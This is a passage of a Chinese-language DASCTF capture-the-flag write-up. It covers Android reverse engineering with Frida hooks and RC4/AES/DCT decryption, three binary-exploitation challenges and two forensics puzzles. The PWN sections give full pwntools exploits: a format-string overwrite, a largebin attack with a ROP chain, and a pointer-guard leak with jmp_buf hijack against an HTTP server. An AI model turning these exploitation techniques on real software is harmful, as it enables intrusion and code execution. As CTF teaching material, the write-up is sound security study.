let NoteActivity = Java.use("site.qifen.note.ui.NoteActivity");
NoteActivity["loadData"].implementation = function (str) {
    console.log(`NoteActivity.loadData is called: str=${str}`);
    let result = this["loadData"](str);
    console.log(`NoteActivity.loadData result=${result}`);
    return result;
};
```

将输出的bytes保存为一个新的Dex文件即可。或者我们分析发现程序是RC4解密的Sex.jpg

```java
 public byte[] loadData(String str) {
        try {
            InputStream open = getAssets().open(str);
            byte[] encryptedData = new byte[open.available()];
            open.read(encryptedData);
            open.close();
            byte[] key = "DASCTF".getBytes();
            return rc4Decrypt(key, encryptedData);
        } catch (IOException e) {
            Log.e("错误", "加载数据时发生错误", e);
            return null;
        }
    }

    private byte[] rc4Decrypt(byte[] key, byte[] data) {
        int[] S = new int[256];
        for (int i = 0; i < 256; i++) {
            S[i] = i;
        }
        int j = 0;
        for (int i2 = 0; i2 < 256; i2++) {
            j = ((S[i2] + j) + (key[i2 % key.length] & UByte.MAX_VALUE)) % 256;
            int temp = S[i2];
            S[i2] = S[j];
            S[j] = temp;
        }
        int i3 = data.length;
        byte[] result = new byte[i3];
        int i4 = 0;
        int j2 = 0;
        for (int k = 0; k < data.length; k++) {
            i4 = (i4 + 1) % 256;
            j2 = (S[i4] + j2) % 256;
            int temp2 = S[i4];
            S[i4] = S[j2];
            S[j2] = temp2;
            int t = (S[i4] + S[j2]) % 256;
            result[k] = (byte) (data[k] ^ S[t]);
        }
        return result;
    }
```

写出解密代码即可

```python
def rc4_initialize(key):
    # 初始化S盒
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    return S

def rc4_generate_keystream(S, data_length):
    # 生成密钥流
    i = 0
    j = 0
    keystream = []
    for _ in range(data_length):
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        K = S[(S[i] + S[j]) % 256]
        keystream.append(K)
    return keystream

def rc4_encrypt(key, data):
    key = [ord(c) for c in key]
    S = rc4_initialize(key)
    keystream = rc4_generate_keystream(S, len(data))
    encrypted_data = bytes([data_byte ^ keystream_byte for data_byte, keystream_byte in zip(data, keystream)])
    return encrypted_data

def main():
    # 文件名和密钥
    filename = 'Sex.jpg'
    key = 'DASCTF'

    # 读取文件内容
    with open(filename, 'rb') as f:
        data = f.read()

    # 进行 RC4 解密
    encrypted_data = rc4_encrypt(key, data)

    # 保存解密后的数据到新文件
    with open('Encrypto.dex', 'wb') as f:
        f.write(encrypted_data)

    print("解密完成，解密后的文件已保存为 'Encrypto.dex")

if __name__ == "__main__":
    main()

```

最终发现其实就是一个AES

```java
package site.qifen.note.ui;

import android.util.Base64;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

/* loaded from: E:\DASCTF-46\BabAndroid\加密dex\DASCTF */
public class Encrypto {
    private static final String KEY = "DSACTF";
    private static final String TAG = "Encrypto";

    private static byte[] customHash(String input) {
        byte[] keyBytes = new byte[16];
        int[] temp = new int[16];
        for (int i = 0; i < input.length(); i++) {
            int charVal = input.charAt(i);
            for (int j = 0; j < 16; j++) {
                temp[j] = ((temp[j] * 31) + charVal) % 251;
            }
        }
        for (int i2 = 0; i2 < 16; i2++) {
            keyBytes[i2] = (byte) (temp[i2] % 256);
        }
        return keyBytes;
    }

    public static String encrypt(String data) throws Exception {
        byte[] keyBytes = customHash(KEY);
        SecretKeySpec secretKeySpec = new SecretKeySpec(keyBytes, "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, secretKeySpec);
        byte[] encryptedBytes = cipher.doFinal(data.getBytes("UTF-8"));
        return Base64.encodeToString(encryptedBytes, 2);
    }
}
```

通过Hook获取key，或者自己直接算，都可以。  
Hook代码如下：

```javascript
 Java.enumerateClassLoaders({
        onMatch: function (loader) {
            try {

                var factory = Java.ClassFactory.get(loader);
                var CheckerClass = factory.use("site.qifen.note.ui.Encrypto");
                var key = CheckerClass.customHash("DSACTF");
                console.log(key);


            } catch (e) {
                // console.log("Error accessing class or method: " + e);
            }
        },
        onComplete: function () {
        }
    });
```



发现hook到的返回值如下：  
13,13,13,13,13,13,13,13,13,13,13,13,13,13,13,13如果自己算customHash代码如下：

```python
def custom_hash(input_string):
    key_bytes = bytearray(16)  # 创建一个16字节的数组
    temp = [0] * 16  # 初始化一个长度为16的整数数组，所有元素为0

    # 遍历输入字符串中的每个字符
    for char in input_string:
        char_val = ord(char)  # 获取字符的Unicode编码
        for j in range(16):
            temp[j] = (temp[j] * 31 + char_val) % 251  # 更新临时数组

    # 将计算得到的临时数组转换为字节串
    for i in range(16):
        key_bytes[i] = temp[i] % 256

    return bytes(key_bytes)  # 返回字节串

# 测试函数
input_string = "DSACTF"
result = custom_hash(input_string)
for i in result:
    print(hex(i),end=',');

```



解AES得到如下字符串:458.853181,-18.325492,-18.251911,-2.097520,-21.198660,-22.304648,21.103162,-5.786284,-15.248906,15.329286,16.919499,-19.669045,30.928253,-37.588034,-16.593954,-5.505211,3.014744,6.553616,31.131491,16.472500,6.802400,-78.278577,15.280099,3.893073,56.493581,-34.576344,30.146729,4.445671,6.732204



1. Native分析  
主要逻辑如下

```cpp
__int64 __fastcall Java_site_qifen_note_ui_NoteActivity_sendInit(_JNIEnv *a1, __int64 a2, __int64 a3)
{
  std::__ndk1 *v3; // x0
  __int64 v5; // [xsp+8h] [xbp-138h]
  char *v6; // [xsp+10h] [xbp-130h]
  __int64 v7; // [xsp+48h] [xbp-F8h]
  __int64 v8; // [xsp+50h] [xbp-F0h]
  __int64 StringUTFChars; // [xsp+68h] [xbp-D8h]
  char v12[24]; // [xsp+88h] [xbp-B8h] BYREF
  char v13[24]; // [xsp+A0h] [xbp-A0h] BYREF
  __int64 v14; // [xsp+B8h] [xbp-88h] BYREF
  __int64 v15; // [xsp+C0h] [xbp-80h] BYREF
  char v16[24]; // [xsp+C8h] [xbp-78h] BYREF
  char v17[24]; // [xsp+E0h] [xbp-60h] BYREF
  char v18[24]; // [xsp+F8h] [xbp-48h] BYREF
  char v19[24]; // [xsp+110h] [xbp-30h] BYREF
  __int64 v20; // [xsp+128h] [xbp-18h]

  v20 = *(_ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2)) + 40);
  StringUTFChars = _JNIEnv::GetStringUTFChars(a1, a3, 0LL);
  sub_15994(v19, StringUTFChars);
  _JNIEnv::ReleaseStringUTFChars(a1, a3, StringUTFChars);
  v8 = sub_15A40(v19);
  v7 = sub_15AB4(v19);
  std::vector<int>::vector<std::__wrap_iter<char *>>(v18, v8, v7);
  encrypt(v18);
  sub_15C34(v16);
  v15 = sub_15C74(v17);
  v14 = sub_15CB4(v17);
  while ( (sub_15CF0(&v15, &v14) & 1) != 0 )
  {
    v3 = sub_15D38(&v15);
    std::to_string(v3, *v3);
    sub_15D50(v12, ",");
    sub_15D98(v16, v13);
    std::string::~string(v13);
    std::string::~string(v12);
    sub_15E34(&v15);
  }
  if ( (sub_15E5C(v16) & 1) == 0 )
    sub_15EA0(v16);
  v6 = sub_15FD4(v16);
  v5 = _JNIEnv::NewStringUTF(a1, v6);
  std::string::~string(v16);
  sub_15668(v17);
  sub_15FF8(v18);
  std::string::~string(v19);
  _ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2));
  return v5;
}
```

```cpp
double *__usercall encrypt@<X0>(__int64 a1@<X0>, __int64 a2@<X8>)
{
  double *result; // x0
  double *v3; // x8
  double v4; // [xsp+18h] [xbp-88h]
  double v5; // [xsp+28h] [xbp-78h]
  double v7; // [xsp+70h] [xbp-30h]
  int j; // [xsp+78h] [xbp-28h]
  int i; // [xsp+7Ch] [xbp-24h]
  int v10; // [xsp+84h] [xbp-1Ch]
  __int64 v12[2]; // [xsp+90h] [xbp-10h] BYREF

  v12[1] = *(_ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2)) + 40);
  v10 = sub_15548(a1);
  v12[0] = 0LL;
  result = std::vector<double>::vector(a2, v10, v12);
  for ( i = 0; i < v10; ++i )
  {
    for ( j = 0; j < v10; ++j )
    {
      v7 = *sub_15608(a1, j);
      v5 = cos((j + 0.5) * (i * 3.14159265) / v10) * v7;
      v3 = sub_15638(a2, i);
      *v3 = *v3 + v5;
    }
    if ( i )
      v4 = sqrt(2.0 / v10);
    else
      v4 = sqrt(1.0 / v10);
    result = sub_15638(a2, i);
    *result = *result * v4;
  }
  _ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2));
  return result;
}
```

典型的离散余弦变换



1. EXP:

```cpp
#include <iostream>
#include <vector>
#include <cmath>

std::vector<double> decrypt(const std::vector<double>& input) {
    int v9 = input.size();
    std::vector<double> result(v9, 0.0);

    for (int i = 0; i < v9; ++i) {
        for (int j = 0; j < v9; ++j) {
            double v7 = (j == 0) ? sqrt(1.0 / v9) : sqrt(2.0 / v9);
            double v5 = input[j];
            double v6 = cos((i + 0.5) * (3.141592653589793 * j) / v9) * v5 * v7;
            result[i] += v6;
        }
        // 四舍五入
        result[i] = round(result[i]);
    }

    return result;
}

int main() {
    std::vector<double> input = {458.853181, -18.325492, -18.251911, -2.097520, -21.198660, -22.304648, 21.103162, -5.786284, -15.248906, 15.329286, 16.919499, -19.669045, 30.928253, -37.588034, -16.593954, -5.505211, 3.014744, 6.553616, 31.131491, 16.472500, 6.802400, -78.278577, 15.280099, 3.893073, 56.493581, -34.576344, 30.146729, 4.445671, 6.732204};
    std::vector<double> decrypted = decrypt(input);
    for (const auto& value : decrypted) {
        std::cout << (char) value;
    }
    std::cout << std::endl;

    return 0;
}
```

# PWN
## 题目：<font style="color:rgb(33, 37, 41);">springboard</font>
解题步骤

```plain
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int i; // [rsp+Ch] [rbp-4h]

  myinit(argc, argv, envp);
  puts("Life is not boring, dreams are not out of reach.");
  puts("Sometimes you just need a springboard.");
  puts("Then you can see a wider world.");
  puts("There may be setbacks along the way.");
  puts("But keep your love of life alive.");
  puts("I believe that you will succeed.");
  puts("Good luck.");
  putchar(10);
  puts("Here's a simple pwn question, challenge yourself.");
  for ( i = 0; i <= 4; ++i )
  {
    puts("You have an 5 chances to get a flag");
    printf("This is the %d time\n", (unsigned int)(i + 1));
    puts("Please enter a keyword");
    read(0, bss, 0x40uLL);
    printf(bss);
  }
  return 0;
}
```

```plain
非栈上格式化字符串漏洞利用了，5次修改，可以直接改og(这里的栈空间比较稳定，都可以2字节写)
```

```plain
首先去找偏移
可以找到
__libc_start_main+240的偏移为9
下面一个连续三个且指向栈空间的指针是我们着重需要利用的
```

![image-1730940378151](./assets/image-1730940378151.png)

```python
ru('Please enter a keyword\n')
sl('%9$p-%11$p')
ru('0x')
libc_base=int(r(12),16)-libc.sym['__libc_start_main']-240
leak('libc_base ',libc_base)


ru('0x')
stack=int(r(12),16)
leak('stack ',stack)
stack1=stack-224
leak('stack1 ',stack1)
leak('stack1&0xffff ',stack1&0xffff)
ogs=[0x45226,0x4527a,0xf03a4,0xf1247]
og=libc_base+ogs[0]
leak('og',og)

leak('og&0xffff',og&0xffff)
leak('(og>>16)&0xff',(og>>16)&0xff)
```

```plain
算出来__libc_start_main+240的位置
```

![image-1730940378753](./assets/image-1730940378753.png)

```plain
然后就是利用非栈上格式化字符串去令偏移为11处的指针改成__libc_start_main+240的位置
```

```python
sla('Please enter a keyword','%'+str(stack1&0xffff)+'c%11$hn')
```

![image-1730940379387](./assets/image-1730940379387.png)

```plain
改完后我们就可以看到偏移11处的指针已经指向了__libc_start_main+240
然后我们去找第二个位置处的指针，在下面可以找到，偏移为37，这时候__libc_start_main+240已经处于第三个位置了，然后我们就可以修改了
```

```python
sla('Please enter a keyword','%'+str(og&0xffff)+'c%37$hn')
sla('Please enter a keyword','%'+str((stack1+2)&0xffff)+'c%11$hn')
sla('Please enter a keyword','%'+str((og>>16)&0xff)+'c%37$hhn')
```

```plain
修改后四位后，我们把偏移为11处的地址改为stack1+2的地址，然后就能修改__libc_start_main+240的高地址的4位了
```

![image-1730940380044](./assets/image-1730940380044.png)

```plain
成功修改
```

![image-1730940380628](./assets/image-1730940380628.png)

```plain
需要注意的是偏移位37处的三个连续的指针，有可能前倒数第5位是不一样的，但是这个几率很小，所以多运行几遍exp就直接出了
```

**exp**

```python
from pwn import *
from ctypes import *

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num                :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
l64     = lambda      :u64(p.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda      :u32(p.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
context.terminal = ['gnome-terminal','-x','sh','-c']
context(os='linux',arch='amd64',log_level='debug')

p=process('./pwn')
elf = ELF('./pwn')
libc = ELF('libc.so.6')

def duan():
    gdb.attach(p)
    pause()

ru('Please enter a keyword\n')
sl('%9$p-%11$p')
ru('0x')
libc_base=int(r(12),16)-libc.sym['__libc_start_main']-240
leak('libc_base ',libc_base)


ru('0x')
stack=int(r(12),16)
leak('stack ',stack)
stack1=stack-224
leak('stack1 ',stack1)
leak('stack1&0xffff ',stack1&0xffff)
ogs=[0x45226,0x4527a,0xf03a4,0xf1247]
og=libc_base+ogs[0]
leak('og',og)

leak('og&0xffff',og&0xffff)
leak('(og>>16)&0xff',(og>>16)&0xff)

sla('Please enter a keyword','%'+str(stack1&0xffff)+'c%11$hn')
sla('Please enter a keyword','%'+str(og&0xffff)+'c%37$hn')
sla('Please enter a keyword','%'+str((stack1+2)&0xffff)+'c%11$hn')
sla('Please enter a keyword','%'+str((og>>16)&0xff)+'c%37$hhn')

itr()

```



## 题目：<font style="color:rgb(33, 37, 41);">magicbook</font>
解题步骤

在create功能中给了5次申请chunk的机会，并且在delete中有给了一次在堆地址+8的的位置写0x18字节的功能

这样设计恰好可以进行一次的largebin attack

```c
__int64 delete_the_book()
{
  unsigned int v1; // [rsp+0h] [rbp-10h] BYREF
  int v2; // [rsp+4h] [rbp-Ch] BYREF
  char buf[8]; // [rsp+8h] [rbp-8h] BYREF
 
  puts("which book would you want to delete?");
  __isoc99_scanf("%d", &v2);
  if ( v2 > 5 || !p[v2] )
  {
    puts("wrong!!");
    exit(0);
  }
  free((void *)p[v2]);
  puts("Do you want to say anything else before being deleted?(y/n)");
  read(0, buf, 4uLL);
  if ( d && (buf[0] == 89 || buf[0] == 121) )
  {
    puts("which page do you want to write?");
    __isoc99_scanf("%u", &v1);
    if ( v1 > 4 || !p[v2] )
    {
      puts("wrong!!");
      exit(0);
    }
    puts("content: ");
    read(0, (void *)(p[v1] + 8LL), 0x18uLL);
    --d;
    return 0LL;
  }
  else
  {
    if ( d )
      puts("ok!");
    else
      puts("no ways!!");
    return 0LL;
  }
}
 
void *edit_the_book()
{
  size_t v0; // rax
  char buf[32]; // [rsp+0h] [rbp-20h] BYREF
 
  puts("come on,Write down your story!");
  read(0, buf, book);
  v0 = strlen(buf);
  return memcpy(dest, buf, v0);
}
 
```

然后我们再看到edit功能，这个edit只能对最顶端的堆块进行写操作，而且写入大小为book值

而book值是一个全局变量，只能根据申请最大堆块数量而变化，常规的最大值为5，显然无法进行堆利用

但是结合之前的largebin attack的知识，在free的时候写指针next_bk=&book-0x20，这样构造的largebin attack能将book变量大小改成一个堆地址，这样就可以在edit处导致一个栈溢出



pwndbg> tele 0x56237bc4b000+0x4040  
00:0000│  0x56237bc4f040 (stderr@@GLIBC_2.2.5) —▸ 0x7f187a7ab5c0 (_IO_2_1_stderr_) ◂— 0xfbad2087  
01:0008│  0x56237bc4f048 (completed) ◂— 0x0  
02:0010│  0x56237bc4f050 (book) ◂— 0xd961  
03:0018│  0x56237bc4f058 ◂— 0x0  
04:0020│  0x56237bc4f060 (p) —▸ 0x56237c7cd0c0 —▸ 0x56237c7cd960 ◂— 0x0  
05:0028│  0x56237bc4f068 (p+8) —▸ 0x56237c7cd520 ◂— 0x0  
06:0030│  0x56237bc4f070 (p+16) —▸ 0x56237c7cd970 —▸ 0x7f187a7aafe0 (main_arena+1120) —▸ 0x7f187a7aafd0 (main_arena+1104) —▸ 0x7f187a7aafc0 (main_arena+1088) ◂— ...  
07:0038│  0x56237bc4f078 (p+24) —▸ 0x56237c7cddc0 ◂— 0x0

由于堆地址太大会导致read报错所以在main的开头还限制了book的大小为原大小的低2字节，方便进行利用（也算个提示吧hh）

之后就是正常的栈溢出rop写orw链读取flag的栈操作了

**exp：**

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')

file_name = './pwn'
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc=ELF('./libc.so.6')
li = lambda x : print('\x1b[01;38;5;214m' + str(x) + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + str(x) + '\x1b[0m')

#context.terminal = ['tmux','splitw','-h']

debug = 1
if debug:
    r = remote('127.0.0.1',8888)
else:
    r = process(file_name)

elf = ELF(file_name)

def dbg():
    gdb.attach(r)
    pause()	
def dbgg():
    raw_input()

#dbgg()

menu = 'choice:\n'

def add(size):
    r.sendlineafter(menu,'1')
    r.sendlineafter('need?\n', str(size))

def edit(content):
    r.sendlineafter(menu,'3')
    #dbg()
    r.sendlineafter('story!\n', content)

def delete(index,choice='n'):
    r.sendlineafter(menu,'2')
    r.sendlineafter('delete?\n', str(index))
    r.sendlineafter('deleted?(y/n)\n', choice)

r.recvuntil("give you a gift: ")
addr = int(r.recv(14),16)-0x4010
add(0x450)
add(0x440)
add(0x440)
delete(0)
add(0x498)

delete(2,'y')
r.sendlineafter('write?\n','0')
r.sendafter('content: \n',p64(addr+0x101a)+p64(0)+p64(addr+0x4050-0x20))
add(0x4f0)

ret = addr+0x101a
rdi = addr+0x1863
puts_got = addr+0x3F88
puts_plt = addr+0x1140
pl = b'a'*0x28+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(addr+0x15E1)


edit(pl)
libc_base = u64(r.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))-libc.sym['puts']#-0x080e50#
rdi = libc_base + next(libc.search(asm('pop rdi;ret;')))
rsi = libc_base + next(libc.search(asm('pop rsi;ret;')))
rdx = libc_base + next(libc.search(asm('pop rdx;pop r12;ret;')))
r12 =  libc_base + next(libc.search(asm('pop r12;ret;')))
leave_ret = libc_base + next(libc.search(asm('leave;ret;')))
open_addr=libc.symbols['open']+libc_base
read_addr=libc.symbols['read']+libc_base
write_addr=libc.symbols['write']+libc_base
puts_addr=libc.symbols['puts']+libc_base
print(hex(libc_base))
print(hex(addr))


r.sendlineafter('story!\n', b'a'*0x28+p64(rdi)+p64(0)+p64(rsi)+p64(addr+elf.bss()+0x100)+p64(rdx)+p64(0x10)+p64(0)+p64(read_addr)+p64(rdi)+p64(addr+elf.bss()+0x100)+p64(rsi)+p64(0)+p64(rdx)+p64(0)+p64(0)+p64(open_addr)+p64(rdi)+p64(3)+p64(rsi)+p64(addr+elf.bss()+0x200)+p64(rdx)+p64(0x30)+p64(0)+p64(read_addr)+p64(rdi)+p64(1)+p64(rsi)+p64(addr+elf.bss()+0x200)+p64(rdx)+p64(0x30)+p64(0)+p64(write_addr))

r.send('./flag\x00\x00')



r.interactive()
```



## 题目：<font style="color:rgb(33, 37, 41);">vhttp</font>
解题步骤

首先在直接在浏览器访问，可以下载程序以及对应依赖。

然后对程序进行分析，我们知道这是一个http server，在while循环中，可以看到对于http 协议header的解析

```c
  if ( v9 )
  {
    status = v9;
    puts("error");
  }
  else
  {
    dword_405070 = 0;
    v15 = sub_4014F6(&unk_405140, 511LL);
    if ( !v15 )
      longjmp(env, 1);
    LODWORD(v19) = 0;
    qword_405040 = (void *)sub_401582(v15, &v19, 32LL);
    haystack = (char *)sub_401582(v15, &v19, 32LL);
    ::s1 = (char *)sub_401611(v15, &v19);
    qword_405040 = (void *)sub_4016CE(qword_405040);
    haystack = (char *)sub_4016CE(haystack);
    ::s1 = (char *)sub_4016CE(::s1);
    if ( strncmp(::s1, "HTTP/1.0", 8uLL) && strncmp(::s1, "HTTP/1.1", 8uLL) )
      longjmp(env, 2);
    v8 = 0;
    while ( 1 )
    {
      s1 = (char *)sub_4014F6(&unk_405140, 511LL);
      if ( !s1 )
        longjmp(env, 1);
      if ( !*s1 || !strcmp(s1, "\r") )
        break;
      v6 = 0;
      v17 = (char *)sub_401582(s1, &v6, 58LL);
      v18 = (char *)sub_401611(s1, &v6);
      v17 = (char *)sub_4016CE(v17);
      v18 = (char *)sub_4016CE(v18);
      if ( v8 <= dword_405058 )
      {
        if ( v8 <= 3 )
          v3 = 4;
        else
          v3 = 2 * v8;
        v10 = v3;
        ptr = realloc(ptr, 16LL * v3);
        v8 = v10;
      }
      v19 = v17;
      nptr = v18;
      v4 = (char **)((char *)ptr + 16 * dword_405058);
      v5 = v18;
      *v4 = v17;
      v4[1] = v5;
      ++dword_405058;
      if ( !strcasecmp(v19, "content-length") )
      {
        endptr = 0LL;
        v11 = strtol(nptr, &endptr, 10);
        if ( nptr != endptr )
          dword_405070 = v11;
      }
    }
    if ( strstr(haystack, "flag.txt") )
      start_routine = (void *(*)(void *))off_405010;
    else
      start_routine = (void *(*)(void *))off_405018;
    pthread_create(&newthread, 0LL, start_routine, &qword_405040);
    pthread_join(newthread, 0LL);
    status = 0;
  }
```







解析完成后，存在一个如下全局结构体

```c

struct http_header
{
    char * method;
    char * path;
    char * version;
    int header_count;
    struct Header * headers;
    char * data;
    int content_length;
    jmp_buf err;
};
```



content_length由http header中的content-length确定



```c
// sub_401ce7  
for ( i = 0; i <= 1; ++i )
  {
    fread(s, *(int *)(a1 + 48), 1uLL, stdin);
    if ( strncmp(s, "\r\nuser=newbew", 0xCuLL) )
      break;
    write(1, "HTTP/1.1 403 Forbidden\r\n", 0x18uLL);
    write(1, "Content-Type: text/html\r\n", 0x19uLL);
    write(1, "\r\n", 2uLL);
    write(1, "<h1>Forbidden</h1>", 0x12uLL);
    v1 = strlen(s);
    write(1, s, v1);
  }
```



这里的fread的length就是之前得到的content_length，这是我们可以控制的，因此这里存在一个栈溢出



但是由于退出此函数都是exit，无法直接ROP



这里的考点在于setjmp函数，其通过一个jmp_buf结构体保存寄存器的值，longjmp通过恢复这些寄存器的值进行跳转



因此，如果我们覆盖了jmp_buf结构体，就可以劫持程序控制流程



但是jmp_buf中栈寄存器和rip都被TCB中的pointer_guard保护

注意到，这个溢出发生在线程中

线程的栈靠近线程TCB，由于程序运行时其他函数需要用到pointer guard， 因此不能直接覆盖，需要leak



因此，我们可以带出pointer guard

```c
// sub_401ce7  
    v1 = strlen(s);
    write(1, s, v1);
```



然后，覆盖jmp buf中的rip和栈指针可以栈迁移进行ROP



最后exp如下：

```python
from pwn import *

context.update(arch='amd64', os='linux')
context.log_level = 'info'
exe_path = ('./vhttp')
exe = context.binary = ELF(exe_path)
# libc = ELF('')

gdb_script = '''
b pthread_create
c
finish
thread 2
b *0x000000000040101a
'''
# 0x7fcb1c21ac10
host = 'node5.buuoj.cn'
port = 28312
if sys.argv[1] == 'r':
    p = remote(host, port)
elif sys.argv[1] == 'p':
    p = process(exe_path)  
else:
    p = gdb.debug(exe_path, gdb_script)
    
def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]

def gdb_pause(p):
    gdb.attach(p)  
    pause()


## ROP Chain


## Base 

## rdx: 555
## rbp: 507
## rsp: 547


def circular_left_shift(value, shift):
    # 确保value是一个64位整数
    value &= 0xFFFFFFFFFFFFFFFF
    # 执行循环左移操作
    shifted_value = ((value << shift) & 0xFFFFFFFFFFFFFFFF) | (value >> (64 - shift))
    return shifted_value

def ptr_g(value, pg):
    val = value ^ pg
    return circular_left_shift(val, 17)


ret_addr = 0x000000000040101a

pop_rdi = 0x00000000004028f3

pop_rsi_r15 = 0x00000000004028f1

pop_rdx = 0x000000000040157d

buffer = 0x0405140

open_plt = 0x4013C0

read_plt = 0x401300

write_plt = 0x4012A0

flag_add = 0x40338A


def pwn():
    # payload = cyclic(0x208+8*5+7)
    
    test_payload = b"GET / HTTP/1.1\r\n"
    test_payload+= b"content-length:2848\r\n"
    # test_payload+= b"aaaaaaa:bbbb\r\n"
    rop_payload = b"a"*(0x20-1)+b":"
    rop_payload+= p64(ret_addr)*0x4
    rop_payload+= p64(pop_rdi)
    rop_payload+= p64(flag_add)
    rop_payload+= p64(pop_rsi_r15)
    rop_payload+= p64(0x0)
    rop_payload+= p64(0x0)
    rop_payload+= p64(open_plt)
    rop_payload+= p64(pop_rdi)
    rop_payload+= p64(0x3)
    rop_payload+= p64(pop_rsi_r15)
    rop_payload+= p64(buffer+0x100)
    rop_payload+= p64(0x0)
    rop_payload+= p64(pop_rdx)
    rop_payload+= p64(0x200)
    rop_payload+= p64(read_plt)
    rop_payload+= p64(pop_rdi)
    rop_payload+= p64(0x1)
    rop_payload+= p64(pop_rsi_r15)
    rop_payload+= p64(buffer+0x100)
    rop_payload+= p64(0x0)
    rop_payload+= p64(write_plt)
    rop_payload+= rop_payload.ljust(0x100, b"A")
    rop_payload+= b"\r\n"
    
    test_payload+= rop_payload
    
    test_payload+= b"\n\r\n"
    test_payload+= b"user=newbew"+cyclic(2835)
    p.send(test_payload)
    # p.recv(0x800)
    # p.interactive()

    p.recvuntil(b"abciabcj")
    
    pointer_guard = u64(p.recv(8))
    log.success(f"Pointer guard: {hex(pointer_guard)}") 
    
    
    pay2 = b"&pass=v3rdant".ljust(507+8-3, b'A')
    
    regs = flat({
        0x8:ptr_g(buffer+0x28, pointer_guard),
        0x6*8:ptr_g(buffer+0x28, pointer_guard),
        0x7*8:ptr_g(ret_addr, pointer_guard),
        }
    )

    pay2 += regs
    
    print(hex(ptr_g(ret_addr, pointer_guard)))
    

    
    pay2 = pay2.ljust(2840-0x20, b'A')
    pay2+= p64(0x405260)*(0x20//8+2)
    
    p.send(pay2)
    

    # print(p.recvall())
    
    p.interactive()

pwn()
```



# MISC
## 题目：<font style="color:rgb(33, 37, 41);">png_master</font>
解题步骤

下载附件，利用winhex查看

![image-1730940381189](./assets/image-1730940381189.png)

![image-1730940381726](./assets/image-1730940381726.png)

得到第一段flag

用010查看，发现有有问题的IDAT块

![image-1730940382251](./assets/image-1730940382251.png)

提取之后替换一个正常的png的IDAT，然后进行宽高爆破

得到

![image-1730940382789](./assets/image-1730940382789.png)

提示关注2和3

结合原图片的不正常显示

![image-1730940383342](./assets/image-1730940383342.png)

猜测进行了LSB处理，提取一下

```plain
from PIL import Image

img = Image.open('flag.png')
width, height = img.size

flag1 = ''

for y in range(0,height,3):
    for x in range(0,width,2):
        pixel = img.getpixel((x, y))
        print(pixel)
        flag1 += chr(pixel[3])
    print(flag1[:23])
```

得到最后一段flag

![image-1730940383933](./assets/image-1730940383933.png)

## 题目：<font style="color:rgb(33, 37, 41);">EZ_zip</font>
解题步骤

直接解压会报错，010打开模板报错，发现解压文件长度不对

![image-1730940384514](./assets/image-1730940384514.png)

将文件头和目录区的长度都修改为7之后模板不再报错

![image-1730940385104](./assets/image-1730940385104.png)

![image-1730940385687](./assets/image-1730940385687.png)

再解压提示CRC报错，发现是解压方法被改成了store，跟压缩方法对不上

![image-1730940386207](./assets/image-1730940386207.png)

![image-1730940386902](./assets/image-1730940386902.png)

修改解压方式后成功解压出320.zip

注释处可以找到密码提示，是一个嵌套加密的zip，密码为一个字节

![image-1730940387517](./assets/image-1730940387517.png)

爆破脚本：

```python
import pyzipper
import os
for i in range(320,0,-1):
    zip_filename = str(i) + ".zip"
    zf = pyzipper.AESZipFile(zip_filename, 'r', compression=pyzipper.ZIP_LZMA, encryption=pyzipper.WZ_AES)
    for j in range(0,0xff+1):
        password = j.to_bytes(length=1, byteorder='big')
        zf.setpassword(password)
        try:
            zf.extractall()
            zf.close()
            os.remove(str(i) + ".zip")
            break
        except:
            pass
```

解压得到一个txt，提示加密方法为AES-ECB，并提示key可能在前面的过程中就出现了

![image-1730940388074](./assets/image-1730940388074.png)

联想到前面解压密码是字节形式，通过打印解压密码发现：

```python
import pyzipper
import os
key = b''
for i in range(320,0,-1):
    zip_filename = str(i) + ".zip"
    zf = pyzipper.AESZipFile(zip_filename, 'r', compression=pyzipper.ZIP_LZMA, encryption=pyzipper.WZ_AES)
    for j in range(0,0xff+1):
        password = j.to_bytes(length=1, byteorder='big')
        zf.setpassword(password)
        try:
            zf.extractall()
            key += password
            zf.close()
            os.remove(str(i) + ".zip")
            break
        except:
            pass
print(key[::-1].hex())
```

```plain
c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11
```

是循环的一个64位字符，将其当作key解密aes得到flag

